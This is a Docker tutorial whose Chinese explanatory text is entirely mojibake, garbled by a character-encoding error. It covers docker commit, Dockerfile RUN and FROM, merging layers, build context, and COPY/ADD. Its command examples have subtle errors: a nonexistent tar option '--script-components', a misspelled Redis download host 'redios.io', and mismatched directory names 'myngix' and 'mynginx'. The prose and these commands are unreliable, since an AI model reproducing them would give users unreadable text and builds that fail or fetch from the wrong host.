ä¿®æ”¹æ¬¢è¿Žé¡µé¢,ä»¥äº¤äº’å¼ç»ˆç«¯æ–¹å¼è¿›å…¥webserverå®¹å™¨ï¼Œå¹¶æ‰§è¡Œbashå‘½ä»¤ï¼ŒèŽ·å¾—ä¸€ä¸ªå¯æ“ä½œçš„shellï¼Œä½¿ç”¨æ–°å†…å®¹è¦†ç›–æŒ‡å®šæ–‡ä»¶çš„å†…å®¹docker exec -it webserver bashroot@xxx: /# echo '&lt;h1&gt;Hello,Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.htmlroot@xxx: /# exitexit ä¿®æ”¹äº†å®¹å™¨æ–‡ä»¶ï¼Œä¹Ÿå°±æ˜¯æ”¹åŠ¨äº†å®¹å™¨çš„å­˜å‚¨å±‚ï¼Œé€šè¿‡ docker diffå¯ä»¥çœ‹åˆ°å…·ä½“çš„æ”¹å˜ å®šåˆ¶å¥½å˜åŒ–åŽï¼Œä¿å­˜ä¸‹æ¥å½¢æˆé•œåƒã€‚å½“æˆ‘ä»¬è¿è¡Œä¸€ä¸ªå®¹å™¨ï¼ˆä¸ä½¿ç”¨å·ï¼‰ï¼Œæˆ‘ä»¬åšçš„ä»»ä½•æ–‡ä»¶ä¿®æ”¹éƒ½ä¼šè¢«è®°å½•äºŽå®¹å™¨å­˜å‚¨å±‚é‡Œã€‚è€Œdockeræä¾›äº†docker commitå‘½ä»¤ï¼Œå¯ä»¥å°†å®¹å™¨çš„å­˜å‚¨å±‚ä¿å­˜ä¸‹æ¥æˆä¸ºé•œåƒã€‚åœ¨åŽŸæœ‰é•œåƒçš„åŸºç¡€ä¸Šï¼Œå†å åŠ ä¸Šå®¹å™¨çš„å­˜å‚¨å±‚ï¼Œå¹¶æž„æˆæ–°çš„é•œåƒã€‚ä»¥åŽæˆ‘ä»¬è¿è¡Œè¿™ä¸ªæ–°é•œåƒçš„æ—¶å€™ï¼Œå°±ä¼šæ‹¥æœ‰åŽŸæ¥å®¹å™¨æœ€åŽçš„æ–‡ä»¶å˜åŒ– docker commit [é€‰é¡¹] &lt;å®¹å™¨IDæˆ–å®¹å™¨å&gt; [&lt;ä»“åº“å&gt;[:&lt;æ ‡ç­¾&gt;]] 12# å°†å®¹å™¨ä¿å­˜ä¸ºé•œåƒdocker commit --author "Laibh &lt;544289495@qq.com&gt;" --message "ä¿®æ”¹é»˜è®¤é¡µé¢" webserver nginx:v2 æŽ¥ç€ 1234# æŸ¥çœ‹æ–°å®šåˆ¶çš„é•œåƒå¹¶ä½¿ç”¨ï¼Œä¹Ÿå¯ä»¥ä½¿ç”¨docker historyå…·ä½“æŸ¥çœ‹é•œåƒå†…çš„åŽ†å²è®°å½•docker image ls docker run --name web2 -d -p 81:80 nginx:v2 ä½¿ç”¨ docker commit å‘½ä»¤å¯ä»¥ç›´è§‚å¸®åŠ©ç†è§£é•œåƒåˆ†å±‚å­˜å‚¨æ¦‚å¿µï¼Œä½†æ˜¯å®žé™…çŽ¯å¢ƒä¸ä¼šè¿™ä¹ˆåšã€‚ ä»”ç»†è§‚å¯Ÿdocker diff webserverçš„ç»“æžœï¼Œä¼šå‘çŽ°é™¤äº†ä¿®æ”¹çš„æ–‡ä»¶å¤–ï¼Œç”±äºŽå‘½ä»¤çš„æ‰§è¡Œï¼Œè¿˜æœ‰å¾ˆå¤šæ–‡ä»¶è¢«æ”¹åŠ¨æˆ–è€…æ·»åŠ äº†ï¼Œè¿™ä»…ä»…æ˜¯æœ€ç®€å•çš„æ“ä½œï¼Œå¦‚æžœæ˜¯å®‰è£…è½¯ä»¶åŒ…ã€ç¼–è¯‘æž„å»ºï¼Œé‚£ä¼šæœ‰å¤§é‡çš„æ— å…³å†…å®¹è¢«æ·»åŠ è¿›æ¥ï¼Œå¦‚æžœä¸å°å¿ƒæ¸…ç†ï¼Œå°†ä¼šå¯¼è‡´é•œåƒå°¤ä¸ºè‡ƒè‚¿ã€‚ æ­¤å¤–ï¼Œä½¿ç”¨docker commitéƒ½æ˜¯é»‘ç®±æ“ä½œã€‚åªæœ‰åˆ¶ä½œè€…æ‰çŸ¥é“åšäº†ä»€ä¹ˆï¼Œdocker diffå¯ä»¥çœ‹å‡ºä¸€äº›çº¿ç´¢ï¼Œä½†ä¸èƒ½ä¿è¯ç”Ÿæˆä¸€è‡´çš„é•œåƒã€‚ Dockerfileå®šåˆ¶é•œåƒdockerfileæ˜¯ä¸€ä¸ªæ–‡æœ¬æ–‡ä»¶ï¼Œå…¶å†…åŒ…å«äº†ä¸€å¤©å¤©çš„æŒ‡ä»¤ï¼ˆInstructionï¼‰,æ¯ä¸€æ¡æŒ‡ä»¤æž„å»ºä¸€å±‚ï¼Œå› æ­¤æ¯ä¸€æ¡æŒ‡ä»¤çš„å†…å®¹å°±æ˜¯æè¿°è¯¥å±‚åº”å½“å¦‚ä½•æž„å»º åœ¨ä¸€ä¸ªç©ºç™½ç›®å½•ï¼Œå»ºç«‹ä¸€ä¸ªæ–‡ä»¶å¤¹ï¼Œå¹¶å‘½åä¸ºDockerfile 1234567mkdir myngixcd mynginx touch Dockerfilevi Dockerfile# å†…å®¹ä¸ºFROM nginxRun echo '&lt;h1&gt;Hello,Docker!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html FROMæŒ‡å®šåŸºç¡€é•œåƒå®šåˆ¶é•œåƒæ˜¯ä»¥ä¸€ä¸ªé•œåƒä¸ºåŸºç¡€ï¼Œåœ¨å…¶ä¸Šè¿›è¡Œå®šåˆ¶ï¼ŒFROMå°±æ˜¯æŒ‡å®šåŸºç¡€é•œåƒï¼Œå› æ­¤FROMæ˜¯Dockerfileæ–‡ä»¶çš„ç¬¬ä¸€æ¡æŒ‡ä»¤ï¼Œé™¤äº†docker hubçŽ°æœ‰çš„é•œåƒï¼Œè¿˜æœ‰ä¸€ä¸ªç‰¹æ®Šçš„é•œåƒ scratchï¼Œè™šæ‹Ÿé•œåƒï¼Œè¡¨ç¤ºä¸€ä¸ªç©ºç™½çš„é•œåƒ FROM scratch ä»¥å®ƒä¸ºåŸºç¡€çš„è¯ï¼Œæ„å‘³ç€ä¸ä»¥ä»»ä½•é•œåƒä¸ºåŸºç¡€ï¼ŒæŽ¥ä¸‹æ¥å†™çš„æŒ‡ä»¤ä½œä¸ºé•œåƒçš„ç¬¬ä¸€å±‚å¼€å§‹å­˜åœ¨ã€‚ä¸ä»¥ä»»ä½•ç³»ç»Ÿä¸ºåŸºç¡€ï¼Œç›´æŽ¥å°†å¯æ‰§è¡Œæ–‡ä»¶å¤åˆ¶è¿›é•œåƒçš„åšæ³•ä¸ç½•è§ï¼Œå¯¹äºŽLinuxä¸‹é™æ€ç¼–è¯‘çš„ç¨‹åºæ¥è¯´ï¼Œå¹¶ä¸éœ€è¦æœ‰æ“ä½œç³»ç»Ÿæä¾›è¿è¡Œæ—¶æ”¯æŒï¼Œæ‰€éœ€çš„ä¸€åˆ‡åº“éƒ½å·²ç»åœ¨å¯æ‰§è¡Œæ–‡ä»¶é‡Œäº†ï¼Œå› æ­¤ç›´æŽ¥FROM scratchä¼šè®©é•œåƒä½“ç§¯æ›´åŠ å°å·§ã€‚ä½¿ç”¨GOè¯­è¨€å¼€å‘çš„å¼•ç”¨ä¼šä½¿ç”¨è¿™ç§æ–¹å¼ï¼Œè¿™ä¹Ÿæ˜¯ä¸ºä»€ä¹ˆè¯´Goæ˜¯ç‰¹åˆ«é€‚åˆå®¹å™¨å¾®æœåŠ¡æž¶æž„çš„è¯­è¨€çš„åŽŸå› ä¹‹ä¸€ RUNæŒ‡å®šå‘½ä»¤RUNæŒ‡ä»¤æ˜¯å®šåˆ¶é•œåƒæœ€å¸¸è§çš„æŒ‡ä»¤ä¹‹ä¸€ã€‚æ ¼å¼æœ‰ä¸¤ç§ï¼š shellæ ¼å¼ï¼šRUN&lt;å‘½ä»¤&gt;ï¼Œå°±åƒç›´æŽ¥åœ¨å‘½ä»¤è¡Œè¾“å…¥çš„å‘½ä»¤ä¸€æ · execæ ¼å¼ï¼šRUN[&quot;å¯æ‰§è¡Œå‘½ä»¤&quot;,&quot;å‚æ•°1&quot;,&quot;å‚æ•°2&quot;]ï¼Œè¿™æ›´åƒæ˜¯å‡½æ•°è°ƒç”¨ä¸­æ ¼å¼ 123456789FROM debian:jessieRUN apt-get updateRUN apt-get install -y gcc libc6-dev makeRUN wget -O redis.tar.gz "http://download.redios.io/release/redis-3.2.5.tar.gz"RUN mkdir -p /usr/src/redisRUN tar -xzf redis.tar.gz -C /usr/src/redis --script-components=1RUN make -C /usr/src/redisRUN make -C /usr/src/redis install dockerfileä¸­æ¯ä¸ªæŒ‡ä»¤éƒ½ä¼šå»ºç«‹ä¸€å±‚ï¼ŒRUNä¹Ÿä¸ä¾‹å¤–ï¼Œæ¯ä¸€ä¸ªRUNçš„è¡Œä¸ºéƒ½ä¼šæ–°å»ºä¸€å±‚ï¼Œåœ¨å…¶ä¸Šæ‰§è¡Œç»“æžœåŽï¼Œcommitä¸€å±‚çš„ä¿®æ”¹ï¼Œæž„æˆæ–°çš„é•œåƒï¼Œä¸Šé¢è¿™ç§å†™æ³•åˆ›å»ºäº†7ä¸ªé•œåƒï¼Œè¿™æ˜¯å®Œå…¨æ²¡æœ‰æ„ä¹‰çš„ï¼Œè¿è¡Œæ—¶å¾ˆå¤šä¸éœ€è¦çš„ä¸œè¥¿éƒ½è¢«è£…è¿›äº†é•œåƒï¼Œæ¯”å¦‚ç¼–è¯‘ã€æ›´æ–°çš„è½¯ä»¶åŒ…ç­‰ï¼Œç»“æžœå°±æ˜¯äº§ç”Ÿè‡ƒè‚¿ã€éžå¸¸å¤šå±‚çš„é•œåƒï¼Œä¸ä»…å¢žåŠ äº†æž„å»ºæ—¶é—´ï¼Œä¹Ÿå®¹æ˜“å‡ºé”™ã€‚UnionFSæ˜¯æœ‰æœ€å¤§å±‚æ•°é™åˆ¶çš„ï¼Œæ¯”å¦‚AUFS,æ›¾ç»æ˜¯æœ€å¤§ä¸è¶…è¿‡42å±‚ï¼ŒçŽ°åœ¨æ˜¯ä¸è¶…è¿‡127å±‚ã€‚ ä¸Šé¢çš„Dockerfileæ­£ç¡®å†™æ³•åº”è¯¥æ˜¯ï¼š 1234567891011121314FROM debian:jessieRUN buildDeps='gcc libc6-dev make' \ &amp;&amp; apt-get update \ &amp;&amp; apt-get install -y $buildDeps \ &amp;&amp; wget -O redis.tar.gz "http://download.redios.io/release/redis-3.2.5.tar.gz" \ &amp;&amp; mkdir -p /usr/src/redis \ &amp;&amp; tar -xzf redis.tar.gz -C /usr/src/redis --script-components=1 \ &amp;&amp; make -C /usr/src/redis \ &amp;&amp; make -C /usr/src/redis install \ &amp;&amp; rm -rf /var/lib/apt/lists/* \ &amp;&amp; rm redis.tar.gz \ &amp;&amp; rm -r /usr/src/redis \ &amp;&amp; apt-get purge -y --auto-remove $buildDeps ä¹‹å‰æ‰€æœ‰å‘½ä»¤çš„ç›®çš„åªæœ‰ä¸€ä¸ªï¼Œå°±æ˜¯ç¼–è¯‘ã€å®‰è£…rediså¯æ‰§è¡Œæ–‡ä»¶ã€‚å› æ­¤æ²¡æœ‰å¿…è¦å»ºç«‹å¤šå±‚ï¼Œè¿™é‡Œä»…ä½¿ç”¨ä¸€ä¸ªRUNï¼Œå¹¶ä½¿ç”¨ &amp;&amp;å°†å„ä¸ªéœ€è¦å‘½ä»¤ä¸²è”èµ·æ¥ï¼Œå°†ä¹‹å‰çš„7å±‚å˜æˆ1å±‚ã€‚å¹¶ä¸”ä¸ºäº†æ ¼å¼åŒ–è¿˜è¿›è¡Œäº†æ¢è¡Œã€‚Dockerfileæ”¯æŒShellç±»çš„è¡Œå°¾æ·»åŠ  \çš„å‘½ä»¤è¡Œï¼Œä»¥åŠè¡Œé¦– #è¿›è¡Œæ³¨é‡Šçš„æ ¼å¼ã€‚è‰¯å¥½çš„æ ¼å¼ä¼šè®©æŽ’éšœæ›´åŠ å®¹æ˜“ã€‚ æ­¤å¤–ï¼Œä¸Šé¢çš„å‘½ä»¤è¿˜è¿›è¡Œäº†æ¸…ç†å·¥ä½œï¼Œåˆ é™¤äº†ä¸ºäº†ç¼–è¯‘æž„å»ºæ‰€éœ€è¦çš„è½¯ä»¶ï¼Œæ¸…ç†äº†æ‰€æœ‰ä¸‹è½½ã€å±•å¼€çš„æ–‡ä»¶ï¼Œå¹¶ä¸”è¿˜æ¸…ç†äº†aptç¼“å­˜æ–‡ä»¶ï¼Œåœ¨é•œåƒæž„å»ºè¿‡ç¨‹è¦ç¡®ä¿æ¯ä¸€å±‚åªæ·»åŠ çœŸæ­£éœ€è¦æ·»åŠ çš„ä¸œè¥¿ï¼Œä»»ä½•æ— å…³çš„ä¸œè¥¿éƒ½åº”è¯¥è¢«æ¸…ç†æŽ‰ã€‚ æž„å»ºé•œåƒåœ¨Dockerfileæ–‡ä»¶æ‰€åœ¨ç›®å½•æ‰§è¡Œï¼š 1234567891011docker@default:~/mynginx$ docker build -t nginx:v3 .Sending build context to Docker daemon 2.048kBStep 1/2 : FROM nginx ---&gt; 2622e6cca7ebStep 2/2 : RUN echo '&lt;h1&gt;Hello,Docker!!!&lt;/h1&gt;' &gt; /usr/share/nginx/html/index.html ---&gt; Running in 6b7204234c09Removing intermediate container 6b7204234c09 ---&gt; 4021436fa2edSuccessfully built 4021436fa2edSuccessfully tagged nginx:v3# åœ¨Step2ä¸­ï¼ŒRUNå¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨6b7204234c09ï¼Œæ‰§è¡Œäº†è¦æ±‚çš„å‘½ä»¤ï¼Œå¹¶æäº¤äº†è¿™ä¸€å±‚4021436fa2edï¼Œåˆ é™¤æ‰€ç”¨åˆ°çš„å®¹å™¨RUNå¯åŠ¨äº†ä¸€ä¸ªå®¹å™¨6b7204234c09 docker buildæ ¼å¼ï¼š docker build [é€‰åž‹] &lt;ä¸Šä¸‹æ–‡è·¯å¾„/URL/-&gt; é•œåƒæž„å»ºä¸Šä¸‹æ–‡ï¼ˆContextï¼‰docker build å‘½ä»¤æœ€åŽä¸€ä¸ª .ï¼Œä»£è¡¨å½“å‰ç›®å½•ï¼Œè€ŒDockerfileå°±åœ¨å½“å‰ç›®å½•ï¼Œæ‰€ä»¥ä¼šè¯¯ä»¥ä¸ºè¿™ä¸ªè·¯å¾„æ˜¯æŒ‡å®šDockerfileæ‰€åœ¨è·¯å¾„ï¼Œè¿™æ ·çš„ç†è§£ä¸å‡†ç¡®ï¼Œå…¶å®žè¿™æ˜¯åœ¨æŒ‡å®šä¸Šä¸‹æ–‡è·¯å¾„ã€‚ docker buildçš„å·¥ä½œåŽŸç†ï¼šDockeråœ¨è¿è¡Œæ—¶åˆ†ä¸ºDockerå¼•æ“Žï¼ˆä¹Ÿå°±æ˜¯æœåŠ¡ç«¯å®ˆæŠ¤è¿›ç¨‹ï¼‰å’Œå®¢æˆ·ç«¯å·¥å…·ã€‚Dockerçš„å¼•æ“Žæä¾›äº†ä¸€ç»„REST API,è¢«ç§°ä¸ºDocker Remote APIï¼Œè€Œdockerå‘½ä»¤è¿™æ ·çš„å®¢æˆ·ç«¯å·¥å…·ï¼Œåˆ™æ˜¯é€šè¿‡è¿™ç»„APIä¸ŽDokcerå¼•æ“Žäº¤äº’ï¼Œä»Žè€Œå®Œæˆå„ç§åŠŸèƒ½ã€‚å› æ­¤æˆ‘ä»¬è¡¨é¢ä¸Šå¥½åƒåœ¨æœ¬æœºæ‰§è¡Œå„ç§dockeråŠŸèƒ½ï¼Œå®žé™…ä¸Šï¼Œä¸€åˆ‡éƒ½æ˜¯ä½¿ç”¨çš„è¿œç¨‹è°ƒç”¨å½¢å¼åœ¨æœåŠ¡ç«¯ï¼ˆDockerå¼•æ“Žï¼‰å®Œæˆã€‚ä¹Ÿå› ä¸ºè¿™ç§C/Sè®¾è®¡ï¼Œè®©æˆ‘ä»¬æ“ä½œè¿œç¨‹æœåŠ¡å™¨çš„Dockerå¼•æ“Žå˜å¾—è½»è€Œæ˜“ä¸¾ã€‚ å½“æˆ‘ä»¬è¿›è¡Œé•œåƒæž„å»ºæ—¶ï¼Œå¹¶éžæ‰€æœ‰çš„å®šåˆ¶éƒ½ä¼šé€šè¿‡RUNæŒ‡ä»¤å®Œæˆï¼Œç»å¸¸ä¼šéœ€è¦å°†ä¸€äº›æœ¬åœ°æ–‡ä»¶å¤åˆ¶è¿›é•œåƒï¼Œæ¯”å¦‚é€šè¿‡COPYæŒ‡ä»¤ï¼ŒADDæŒ‡ä»¤ã€‚è€Œdocker buildå‘½ä»¤æž„å»ºé•œåƒï¼Œå¹¶éžåœ¨æœ¬åœ°æž„å»ºï¼Œè€Œæ˜¯åœ¨æœåŠ¡ç«¯ï¼Œä¹Ÿå°±æ˜¯Dockerå¼•æ“Žä¸­æž„å»ºã€‚é‚£ä¹ˆåœ¨è¿™ç§å®¢æˆ·ç«¯/æœåŠ¡ç«¯çš„æž¶æž„ä¸­ï¼Œå¦‚ä½•æ‰èƒ½è®©æœåŠ¡ç«¯èŽ·å¾—æœ¬åœ°æ–‡ä»¶å‘¢ï¼Ÿ è¿™å°±å¼•å…¥äº†ä¸Šä¸‹æ–‡æ¦‚å¿µï¼Œå½“æž„å»ºçš„æ—¶å€™ï¼Œç”¨æˆ·ä¼šæŒ‡å®šæž„å»ºé•œåƒä¸Šä¸‹æ–‡è·¯å¾„ï¼Œdocker buildå‘½ä»¤å¾—çŸ¥è¿™ä¸ªè·¯å¾„åŽï¼Œä¼šå°†è·¯å¾„ä¸‹çš„æ‰€æœ‰å†…å®¹æ‰“åŒ…ï¼Œç„¶åŽä¸Šä¼ ç»™Dockerå¼•æ“Žï¼Œè¿™æ ·Dockerå¼•æ“Žæ”¶åˆ°è¿™ä¸ªä¸Šä¸‹æ–‡ä¹‹åŽï¼Œå±•å¼€å°±ä¼šèŽ·å¾—æž„å»ºé•œåƒæ‰€éœ€è¦çš„ä¸€åˆ‡æ–‡ä»¶ã€‚ ä¾‹å¦‚åœ¨Dockerfileè¿™æ ·å†™ï¼š COPY ./package.json /app/ è¿™å¹¶ä¸æ˜¯è¦å¤åˆ¶æ‰§è¡Œdocker buildå‘½ä»¤æ‰€åœ¨çš„ç›®å½•ä¸‹çš„package.jsonï¼Œä¹Ÿä¸æ˜¯å¤åˆ¶Dockerfileæ‰€åœ¨ç›®å½•ä¸‹çš„package.json,è€Œæ˜¯å¤åˆ¶ä¸Šä¸‹æ–‡contextç›®å½•ä¸‹çš„package.json å› æ­¤ï¼ŒCOPYè¿™ç±»æŒ‡ä»¤ä¸­çš„æºæ–‡ä»¶çš„è·¯å¾„éƒ½æ˜¯ç›¸å¯¹è·¯å¾„ï¼Œå¦‚æžœçœŸçš„éœ€è¦é‚£äº›æ–‡ä»¶ï¼Œåº”è¯¥å°†å®ƒä»¬å¤åˆ¶åˆ°ä¸Šä¸‹æ–‡ç›®å½•ä¸­åŽ»ã€‚è§‚å¯Ÿdocker buildè¾“å‡ºï¼Œå¯ä»¥çœ‹åˆ°è¿™ä¸ªå‘é€ä¸Šä¸‹æ–‡çš„è¿‡ç¨‹ï¼š 12docker@default:~/mynginx$ docker build -t nginx:v3 .Sending build context to Docker daemon 2.048kB ç†è§£æž„å»ºä¸Šä¸‹æ–‡å¯¹äºŽé•œåƒæž„å»ºå¾ˆé‡è¦ï¼Œé¿å…çŠ¯ä¸€äº›ä¸åº”è¯¥çš„é”™è¯¯ï¼Œæ¯”å¦‚åˆå­¦è€…åœ¨å‘çŽ° Copy/opt/xxxx /appä¸å·¥ä½œåŽï¼Œå¹²è„†æŠŠDockerfileæ”¾åˆ°äº†ç¡¬ç›˜è·Ÿç›®å½•åŽ»æž„å»ºï¼Œç»“æžœå‘çŽ°docker buildæ‰§è¡ŒåŽï¼Œåœ¨å‘é€ä¸€ä¸ªå‡ åGBçš„ä¸œè¥¿ï¼Œæžä¸ºç¼“æ…¢è€Œä¸”å®¹æ˜“æž„å»ºå¤±è´¥ï¼Œé‚£æ˜¯å› ä¸ºè¿™ç§åšæ³•æ˜¯è®©docker buildæ‰“åŒ…æ•´ä¸ªç¡¬ç›˜ï¼Œè¿™æ˜¾ç„¶æ˜¯ä½¿ç”¨é”™è¯¯ã€‚ ä¸€èˆ¬æ¥è¯´ï¼Œåº”è¯¥ä¼šå°†Dockerç½®äºŽä¸€ä¸ªç©ºç›®å½•ï¼Œæˆ–è€…æ ¹ç›®å½•ä¸‹é¢ï¼Œå¦‚æžœè¯¥ç›®å½•ä¸‹æ²¡æœ‰æ‰€éœ€æ–‡ä»¶ï¼Œé‚£ä¹ˆåº”è¯¥æŠŠæ‰€éœ€æ–‡ä»¶å¤åˆ¶ä¸€ä»½è¿‡æ¥ã€‚å¦‚æžœç›®å½•ä¸‹æœ‰äº›ä¸œè¥¿ç¡®å®žä¸å¸Œæœ›æž„å»ºæ—¶ä¼ ç»™Dockerå¼•æ“Žï¼Œé‚£ä¹ˆå¯ä»¥ç”¨.dockerignoreå‰”é™¤ä¸éœ€è¦ä½œä¸ºä¸Šä¸‹æ–‡ä¼ é€’ç»™Dockerå¼•æ“Žçš„ã€‚ åœ¨é»˜è®¤æƒ…å†µä¸‹ï¼Œå¦‚æžœä¸é¢å¤–æŒ‡å®šDockerfileçš„è¯ï¼Œä¼šå°†ä¸Šä¸‹æ–‡ç›®å½•ä¸‹çš„åä¸ºDockerfileçš„æ–‡ä»¶ä½œä¸ºDockerfileï¼Œå®žé™…ä¸Šä¸è¦æ±‚åå­—å¿…é¡»ä¸ºDockerfileï¼Œå¹¶ä¸”ä¸è¦æ±‚å¿…é¡»ä½äºŽä¸Šä¸‹æ–‡ç›®å½•ä¸­ï¼Œæ¯”å¦‚ç”¨ -f ../Dockerfile.phpå‚æ•°æŒ‡å®šæŸä¸ªæ–‡ä»¶ä½œä¸º Dockerfile å…¶ä»–Docker buildç”¨æ³•ç›´æŽ¥ç”¨ git repoè¿›è¡Œæž„å»ºdocker buildè¿˜æ”¯æŒä»ŽURLæž„å»ºï¼Œæ¯”å¦‚ä»Ž Git repo 123456789# æŒ‡å®šæž„å»ºæ‰€éœ€è¦çš„git repoï¼Œå¹¶ä¸”æŒ‡å®šé»˜è®¤çš„masteråˆ†æ”¯ï¼Œæž„å»ºç›®å½•ä¸º/814/ï¼Œç„¶åŽdockerå°±ä¼šè‡ªå·±åŽ»git cloneè¿™ä¸ªé¡¹ç›®ã€åˆ‡æ¢åˆ°æŒ‡å®šåˆ†æ”¯ï¼Œå¹¶è¿›å…¥åˆ°æŒ‡å®šç›®å½•åŽå¼€å§‹æž„å»ºdocker build https://github.com/twang2218/gitlab-ce-zh.git#:8.14docker build https://github.com/twang2218/gitlab-ce-zh.git\#:8.14Sending build context to Docker daemon 2.048 kBStep 1 : FROM gitlab/gitlab-ce:8.14.0-ce.08.14.0-ce.0: Pulling from gitlab/gitlab-ceaed15891ba52: Already exists773ae8583d14: Already exists... ç”¨taråŽ‹ç¼©åŒ…æž„å»º1docker build http://server/context.tar.gz å¦‚æžœç»™å‡ºçš„URLä¸æ˜¯Git repoï¼Œè€Œæ˜¯ä¸ªtaråŽ‹ç¼©åŒ…ï¼Œé‚£ä¹ˆDockerå¼•æ“Žä¼šä¸‹è½½è¿™ä¸ªåŒ…ï¼Œå¹¶è‡ªåŠ¨è§£åŽ‹ï¼Œä»¥å…¶ä½œä¸ºä¸Šä¸‹æ–‡ï¼Œå¹¶ä¸”æž„å»ºã€‚ ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å–Dockerfileè¿›è¡Œæž„å»º docker build - &lt; Dockerfile æˆ–è€… cat Dockerfile | docker build - å¦‚æžœæ ‡å‡†è¾“å…¥ä¼ å…¥çš„æ˜¯æ–‡æœ¬æ–‡ä»¶ï¼Œåˆ™å°†å…¶è§†ä¸ºDockerfileï¼Œå¹¶å¼€å§‹æž„å»ºã€‚è¿™ç§å½¢å¼ç”±äºŽç›´æŽ¥ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å–Dockerfileçš„å†…å®¹ï¼Œæ²¡æœ‰ä¸Šä¸‹æ–‡ï¼Œå› æ­¤ä¸å¯ä»¥åƒå…¶ä»–æ–¹æ³•é‚£æ ·å¯ä»¥å°†æœ¬åœ°æ–‡ä»¶COPYè¿›é•œåƒä¹‹ç±»çš„äº‹æƒ… ä»Žæ ‡å‡†è¾“å…¥ä¸­è¯»å–ä¸Šä¸‹æ–‡åŽ‹ç¼©åŒ…é•œåƒæž„å»º docker build - &lt; context.tar.gz å¦‚æžœå‘çŽ°æ ‡å‡†è¾“å…¥çš„æ–‡ä»¶æ ¼å¼æ˜¯ gzip/bzip2/xzçš„è¯ï¼Œå°†ä¼šä½¿å…¶æˆä¸ºä¸Šä¸‹æ–‡åŽ‹ç¼©åŒ…ï¼Œç›´æŽ¥å°†å…¶å±•å¼€ï¼Œå°†é‡Œé¢è§†ä¸ºä¸Šä¸‹æ–‡ï¼Œå¹¶å¼€å§‹æž„å»ºã€‚ æŒ‡ä»¤è¯¦è§£COPYå¤åˆ¶æ–‡ä»¶æ ¼å¼ï¼š COPY &lt;æºè·¯å¾„&gt;...&lt;ç›®æ ‡è·¯å¾„&gt; COPY[&quot;&lt;æºè·¯å¾„1&gt;&quot;,...&quot;&lt;ç›®æ ‡è·¯å¾„&gt;&quot;] å’ŒRUNæŒ‡ä»¤ä¸€æ ·ï¼Œä¹Ÿæœ‰ä¸¤ç§æ ¼å¼ï¼Œä¸€ç§ç±»ä¼¼äºŽå‘½ä»¤è¡Œï¼Œä¸€ç§ç±»ä¼¼äºŽå‡½æ•°è°ƒç”¨ COPYæŒ‡ä»¤å°†ä»Žæž„å»ºä¸Šä¸‹æ–‡ç›®å½•ä¸­&lt;æºè·¯å¾„&gt;çš„æ–‡ä»¶/ç›®å½•å¤åˆ¶åˆ°æ–°çš„ä¸€å±‚çš„é•œåƒå†…çš„&lt;ç›®æ ‡è·¯å¾„&gt;ä½ç½®ï¼Œæ¯”å¦‚ï¼š 1COPY package.json /usr/src/app/ æºè·¯å¾„å¯ä»¥æ˜¯å¤šä¸ªï¼Œç”šè‡³æ˜¯é€šé…ç¬¦ï¼Œå…¶é€šé…ç¬¦è§„åˆ™è¦æ»¡è¶³GOçš„filepath.Matchè§„åˆ™ï¼Œå¦‚ï¼š 12COPY hom* /mydir/COPY hom?.txt /mydir/ &lt;ç›®æ ‡è·¯å¾„&gt;å¯ä»¥æ˜¯å®¹å™¨å†…çš„ç»å¯¹è·¯å¾„ï¼Œä¹Ÿå¯ä»¥æ˜¯ç›¸å¯¹äºŽå·¥ä½œç›®å½•çš„ç›¸å¯¹è·¯å¾„ï¼ˆå·¥ä½œè·¯å¾„å¯ä»¥ç”¨WORKDIRæŒ‡ä»¤æ¥æŒ‡å®šï¼‰ã€‚ç›®æ ‡è·¯å¾„ä¸éœ€è¦äº‹å…ˆåˆ›å»ºï¼Œå¦‚æžœç›®å½•ä¸å­˜åœ¨ä¼šåœ¨å¤åˆ¶æ–‡ä»¶å‰å…ˆè¡Œåˆ›å»ºç¼ºå¤±ç›®å½•ã€‚ æ­¤å¤–ï¼Œè¿˜æœ‰ä¸€ç‚¹ä½¿ç”¨COPYæŒ‡ä»¤ï¼Œæºæ–‡ä»¶çš„å„ç§å…ƒæ•°æ®éƒ½ä¼šä¿ç•™ã€‚æ¯”å¦‚è¯»ã€å†™ã€æ‰§è¡Œæƒé™ã€æ–‡ä»¶å˜æ›´æ—¶é—´ç­‰ã€‚è¿™ä¸ªç‰¹æ€§å¯¹äºŽé•œåƒå®šåˆ¶å¾ˆæœ‰ç”¨ï¼Œç‰¹åˆ«æ˜¯æž„å»ºç›¸å…³æ–‡ä»¶éƒ½åœ¨ä½¿ç”¨Gitè¿›è¡Œç®¡ç†æ—¶ã€‚ ADDæ›´é«˜çº§çš„å¤åˆ¶æ–‡ä»¶ADDæŒ‡ä»¤å’ŒCOPYçš„æ ¼å¼å’Œæ€§è´¨åŸºæœ¬ä¸€è‡´ï¼Œä½†æ˜¯åœ¨COPYåŸºç¡€ä¸Šå¢žåŠ äº†ä¸€äº›åŠŸèƒ½ã€‚ æ¯”å¦‚ &lt;æºè·¯å¾„&gt;å¯ä»¥æ˜¯ä¸€ä¸ªURL,è¿™ç§æƒ…å†µä¸‹Dockerå¼•æ“Žä¼šè§†å›¾åŽ»ä¸‹è½½è¿™ä¸ªé“¾æŽ¥çš„æ–‡ä»¶æ”¾åˆ° &lt;ç›®æ ‡è·¯å¾„&gt;åŽ»ã€‚ä¸‹è½½åŽçš„æ–‡ä»¶æƒé™è‡ªåŠ¨è®¾ç½®ä¸º600ï¼Œå¦‚æžœè¿™å¹¶ä¸æ˜¯æƒ³è¦çš„æƒé™ï¼Œè¿˜è¦å¢žåŠ é¢å¤–çš„ä¸€å±‚RUNè¿›è¡Œæƒé™è°ƒæ•´ã€‚å¦å¤–ï¼Œå¦‚æžœä¸‹è½½ä½†æ˜¯ä¸ªåŽ‹ç¼©åŒ…ï¼Œéœ€è¦è§£åŽ‹ç¼©ï¼Œä¹Ÿä¸€æ ·éœ€è¦é¢å¤–çš„ä¸€å±‚RUNæŒ‡ä»¤è¿›è¡Œè§£åŽ‹ç¼©ã€‚æ‰€ä»¥ä¸å¦‚ç›´æŽ¥ä½¿ç”¨RUN,ç„¶åŽç”¨wgetæˆ–è€…curlå·¥å…·ä¸‹è½½ï¼Œå¤„ç†æƒé™ã€è§£åŽ‹ç¼©ã€ç„¶åŽæ¸…ç†æ— ç”¨æ–‡ä»¶æ›´åˆç†ã€‚å› æ­¤è¿™ä¸ªåŠŸèƒ½å…¶å®žå¹¶ä¸å¥½ç”¨ï¼Œè€Œä¸”ä¸æŽ¨èä½¿ç”¨ 